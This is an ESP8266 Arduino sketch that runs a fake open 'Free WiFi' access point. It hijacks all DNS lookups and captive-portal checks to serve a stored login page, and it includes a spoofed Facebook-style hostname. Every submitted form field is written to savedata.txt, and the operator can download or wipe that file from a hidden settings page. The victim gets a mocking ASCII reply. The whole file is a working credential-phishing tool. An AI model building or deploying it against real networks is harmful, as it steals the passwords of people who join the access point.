#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
IPAddress fbApIP(192, 168, 2, 1);
DNSServer dnsServer;
DNSServer fbDnsServer;

static const char PROGMEM DOWNLOAD_HTML[] = R"rawliteral(  
<!DOCTYPE html>
<html>
   <head>
      <style>
         table, th, td {
         border: 1px solid black;
         }
      </style>
   </head>
   <body>
      <h2>Settings Page</h2>
      <table style="width:20%">
         <tr>
            <td align="center">
               <form method="get" action="/savedata.txt">
                  <button type="submit">Download!</button>
               </form>
            </td>
         </tr>
         <tr>
            <td align="center">
               <form method="get" action="/remove">
                  <button type="submit">Clear</button>
               </form>
            </td>
         </tr>
      </table>
   </body>
</html>
)rawliteral";

ESP8266WebServer server(80);

void handleRoot(){
  server.sendHeader("Location", "/index.html",true);   //Redirect to our html web page
  server.send(302, "text/plane","");
}

bool handleFileRead(String path) {
  Serial.println("inside handle file read");
  Serial.println(path);

  if(path.endsWith("connecttest.txt")) {
    path = "/index.html";  
  }

  if(path.endsWith("redirect")) {
    path = "/index.html";  
  }
  
  if (path.endsWith("/")) {
    path = "/index.html";
  }

  if (path.endsWith("generate_204") || path.endsWith("favicon.ico")) {
    path = "/index.html";
  }
    
  String contentType = getContentType(path);
  
  if (SPIFFS.exists(path)) {
    Serial.println("index file exist!!");
    File file = SPIFFS.open(path, "r");
    server.streamFile(file, contentType);
    file.close();
    return true;
  }
  return false;
}

String getContentType(String filename) {
  if (server.hasArg("download")) {
    return "application/octet-stream";
  } else if (filename.endsWith(".htm")) {
    return "text/html";
  } else if (filename.endsWith(".html")) {
    return "text/html";
  } else if (filename.endsWith(".css")) {
    return "text/css";
  } else if (filename.endsWith(".js")) {
    return "application/javascript";
  } else if (filename.endsWith(".png")) {
    return "image/png";
  } else if (filename.endsWith(".gif")) {
    return "image/gif";
  } else if (filename.endsWith(".jpg")) {
    return "image/jpeg";
  } else if (filename.endsWith(".ico")) {
    return "image/x-icon";
  } else if (filename.endsWith(".xml")) {
    return "text/xml";
  } else if (filename.endsWith(".pdf")) {
    return "application/x-pdf";
  } else if (filename.endsWith(".zip")) {
    return "application/x-zip";
  } else if (filename.endsWith(".gz")) {
    return "application/x-gzip";
  }
  return "text/plain";
}


//format bytes
String formatBytes(size_t bytes) {
  if (bytes < 1024) {
    return String(bytes) + "B";
  } else if (bytes < (1024 * 1024)) {
    return String(bytes / 1024.0) + "KB";
  } else if (bytes < (1024 * 1024 * 1024)) {
    return String(bytes / 1024.0 / 1024.0) + "MB";
  } else {
    return String(bytes / 1024.0 / 1024.0 / 1024.0) + "GB";
  }
}

void handleSave() {
  String str = "Done ...\r\n";

  Serial.print("number of arguments "); 
  Serial.println(server.args());                    // number of arguments


  if (server.args() > 0 ) {
    File f;
    if(SPIFFS.exists("/savedata.txt")) {
      f = SPIFFS.open("/savedata.txt", "a");
    } else {
      f = SPIFFS.open("/savedata.txt", "w");
    }
    
    for ( uint8_t i = 0; i < server.args(); i++ ) {
      str += server.argName(i) + " = " + server.arg(i) + "\r\n";
      f.println(server.argName(i) + " = " + server.arg(i));

      Serial.println("Arg "+ String(i)+"="+ server.argName(i));     
      Serial.println("Arg "+ String(i)+"="+ server.arg(i));
    }
    f.close();
  }
  

  str += "┌∩┐(◣_◢)┌∩┐          ┌∩┐(◣_◢)┌∩┐          ┌∩┐(◣_◢)┌∩┐\r\n";
  str += "\r\n";
  str += "┌∩┐(◣_◢)┌∩┐          ┌∩┐(◣_◢)┌∩┐          ┌∩┐(◣_◢)┌∩┐\r\n";
  str += "\r\n";
  str += "┌∩┐(◣_◢)┌∩┐          ┌∩┐(◣_◢)┌∩┐          ┌∩┐(◣_◢)┌∩┐\r\n";  
  server.send(200, "text/plain", str.c_str());
}


void handleDownload() {
  Serial.print("Download Page");   
  server.send(200, "text/html", DOWNLOAD_HTML);
}

void handleRemove() {
  Serial.print("Remove file operation");
  String removeFile = "/savedata.txt";

  if(SPIFFS.exists(removeFile)) {
        if(SPIFFS.remove(removeFile)) {
              server.send(200, "text/html", "Save file removed");          
        } else {
              server.send(200, "text/html", "Failed to remove file !!");
        };
  } else {
    server.send(200, "text/html", " savedata txt file does not exist !!");  
  }
}


void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println();

  //Initialize File System
  SPIFFS.begin();
  Serial.println("File System Initialized");

  Serial.println("check for files1");
  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    Serial.println("check for files2");
    String fileName = dir.fileName();
    size_t fileSize = dir.fileSize();
    Serial.printf("FS File: %s, size: %s\n", fileName.c_str(), formatBytes(fileSize).c_str());
  }
  Serial.printf("\n");

  //Initialize AP Mode
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Free WiFi");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);
  fbDnsServer.start(DNS_PORT, "www.facebook.poc.com", fbApIP);

  //Initialize Webserver
  server.on("/", HTTP_GET, []() {
    if (!handleFileRead(server.uri())) {
      server.send(200, "text/plain", "FileNotFound");
    }
  });

  server.onNotFound([]() {
  Serial.println(server.uri());
  if (!handleFileRead(server.uri())) {
    server.send(200, "text/plain", "FileNotFound");
  }});

  server.on("/login", HTTP_GET, []() {
  Serial.println(server.uri());
    if (!handleFileRead(server.uri())) {
      server.send(200, "text/plain", "No login Found");
    }
  });

   server.on("/save", handleSave);

   server.on("/download", handleDownload);

   server.on("/remove", handleRemove);
  
//  server.onNotFound(handleWebRequests); //Set setver all paths are not found so we can handle as per URI
  server.begin();  
}

void loop() {
 dnsServer.processNextRequest();
 fbDnsServer.processNextRequest();
 server.handleClient();
}
